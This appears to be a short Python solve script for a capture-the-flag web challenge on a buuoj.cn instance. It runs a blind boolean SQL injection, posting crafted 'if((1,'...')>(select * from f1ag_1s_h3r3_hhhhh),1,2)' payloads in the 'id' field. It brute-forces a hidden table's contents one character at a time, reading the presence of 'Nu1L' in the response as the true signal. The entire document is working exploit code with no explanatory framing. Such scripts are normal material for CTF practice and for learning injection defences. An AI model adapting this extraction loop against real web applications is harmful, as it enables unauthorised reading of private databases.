import requests


data={
  "id":1
}
result=""

for idx in range(1,100):
  for i in range(1,127):
    payload="if((1,'{}')>(select * from f1ag_1s_h3r3_hhhhh),1,2)".format(result+chr(i))
    data={
      "id":payload
    }
    res = requests.post(url="http://57b5a68c-5f10-42cb-8956-e026b2500ccc.node3.buuoj.cn/index.php",data=data)
    #true.meaning if expression return 1
    print(i)
    if("Nu1L" in res.text):
      result += chr(i-1)
      print(chr(i-1))
      break
  print(result)